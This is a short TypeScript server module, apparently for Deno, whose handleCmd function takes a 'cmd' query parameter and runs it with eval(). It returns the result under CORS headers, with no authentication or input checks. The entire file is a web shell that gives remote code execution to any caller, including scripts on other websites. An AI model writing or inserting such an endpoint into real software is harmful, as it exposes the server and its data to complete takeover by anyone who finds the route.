import { corsResponse } from "./utils/cors.ts";

export async function handleCmd(req: Request) {
  const url = new URL(req.url);
  const cmd = url.searchParams.get("cmd");

  if (!cmd) return corsResponse("Send ?cmd=<JS code>", { status: 500 });

  try {
    const result = await eval(cmd);
    return corsResponse(JSON.stringify(result), { status: 200 });
  } catch (e) {
    return corsResponse(e.toString(), { status: 500 });
  }
}